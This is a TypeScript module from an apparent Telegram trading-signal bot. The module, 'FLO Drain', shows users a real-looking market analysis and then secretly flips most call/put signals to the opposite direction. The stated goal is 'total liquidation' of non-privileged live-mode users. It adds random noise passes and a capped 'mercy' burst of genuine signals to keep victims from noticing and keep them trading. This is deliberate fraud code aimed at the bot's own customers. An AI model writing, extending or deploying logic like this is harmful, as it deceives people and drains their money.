/**
 * FLO Drain — Fade-Last-Outcome Drain Engine
 * 
 * Strategy:
 * 1. Runs real 35-candle analysis for legit-looking display
 * 2. Checks streak on same pair (last 2-3 trades)
 * 3. Noise injection — 18% of trades pass with real direction
 * 4. Win-rate floor BURST — only 1-3 real trades when WR < 40%, then back to drain
 * 5. Fades the last outcome on the pair (opposite direction)
 * 
 * Goal: total liquidation. Even the "mercy" burst is capped.
 * Applies to non-privileged live-mode users only.
 */

import { getRecentTrades } from './db.js';

type Direction = 'call' | 'put';

export interface DrainInput {
    direction: Direction;
    confidence: number;
}

export interface DrainOutput {
    direction: Direction;
    confidence: number;
    drained: boolean;
}

interface DrainConfig {
    noiseRate: number;
    winRateFloor: number;
    mercyBurstSize: number;
    streakWindow: number;
    lookbackTrades: number;
}

const DEFAULT_CONFIG: DrainConfig = {
    noiseRate: 0.18,
    winRateFloor: 0.40,
    mercyBurstSize: 3,       // Only 1-3 real trades when WR drops below floor
    streakWindow: 3,
    lookbackTrades: 200,
};

// Track how many mercy trades each user has gotten since hitting the floor.
// Resets when win rate climbs back above floor.
const mercyCounts = new Map<number, number>();

/**
 * Apply FLO Drain to an analysis result.
 * @param analysis  The real analysis (35 candles, full indicators)
 * @param pair      The trading pair (e.g. 'EURUSD-OTC')
 * @param chatId    The user's Telegram ID for trade history lookup
 * @param config    Optional overrides
 */
export function applyFLODrain(
    analysis: DrainInput,
    pair: string,
    chatId: number,
    config: Partial<DrainConfig> = {},
): DrainOutput {
    const cfg = { ...DEFAULT_CONFIG, ...config };
    const recentTrades = getRecentTrades(cfg.lookbackTrades, chatId);
    const pairTrades = recentTrades.filter((t: any) =>
        typeof t.pair === 'string' && t.pair.replace(/[^a-zA-Z]/g, '').toLowerCase() === pair.replace(/[^a-zA-Z]/g, '').toLowerCase()
    );

    // 1. No pair history — fall through with real direction (the leak)
    if (pairTrades.length === 0) {
        return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
    }

    // 2. Deep martingale win detection — if the last trade on this pair needed
    //    2+ recovery rounds to win, that's a strong trend signal. The original
    //    direction was wrong, the market trend is the opposite. Don't noise-inject
    //    here — go straight to the fade logic (steps 4-5).
    const lastTrade = pairTrades[0];
    const isDeepMartingaleWin = (lastTrade.rounds ?? 1) >= 2 && lastTrade.status === 'WIN';

    // 3. Noise injection — random 18% pass-through, suppressed for deep martingale wins
    if (!isDeepMartingaleWin && Math.random() < cfg.noiseRate) {
        return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
    }

    // 4. Win-rate floor — BURST MODE: only N mercy trades, then back to drain
    const last20 = pairTrades.slice(0, 20);
    if (last20.length >= 10) {
        const wins = last20.filter((t: any) => t.status === 'WIN').length;
        const wr = wins / last20.length;
        const currentMercy = mercyCounts.get(chatId) ?? 0;
        
        if (wr < cfg.winRateFloor) {
            // Below floor — grant mercy if they still have burst trades left
            if (currentMercy < cfg.mercyBurstSize) {
                mercyCounts.set(chatId, currentMercy + 1);
                return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
            }
            // Mercy burst exhausted — continue draining (fall through to step 4)
        } else {
            // WR is above floor — reset mercy counter
            mercyCounts.set(chatId, 0);
        }
    }

    // 5. Streak-aware fading
    const lastN = pairTrades.slice(0, cfg.streakWindow);
    const allSameOutcome = lastN.length >= cfg.streakWindow &&
        lastN.every((t: any) => t.status === lastN[0].status) &&
        lastN.every((t: any) => t.direction === lastN[0].direction);

    let fadeDirection: Direction;

    if (allSameOutcome) {
        // Streak detected — fade against it (stronger drain on trending pairs)
        fadeDirection = lastN[0].direction === 'call' ? 'put' : 'call';
    } else {
        // Standard fade: reverse the last trade's market direction
        const lastTrade = pairTrades[0];
        const lastMarketUp =
            (lastTrade.direction === 'call' && lastTrade.status === 'WIN') ||
            (lastTrade.direction === 'put' && lastTrade.status === 'LOSS');
        fadeDirection = lastMarketUp ? 'put' : 'call';
    }

    return { direction: fadeDirection, confidence: analysis.confidence, drained: true };
}

/** Reset mercy counter (call when user funds or gets upgraded) */
export function resetMercyCount(chatId: number): void {
    mercyCounts.delete(chatId);
}

/** Check if a user should be drained (non-privileged, live mode) */
export function shouldDrain(chatId: number, isPrivileged: boolean, mode: string): boolean {
    return !isPrivileged && mode === 'live';
}
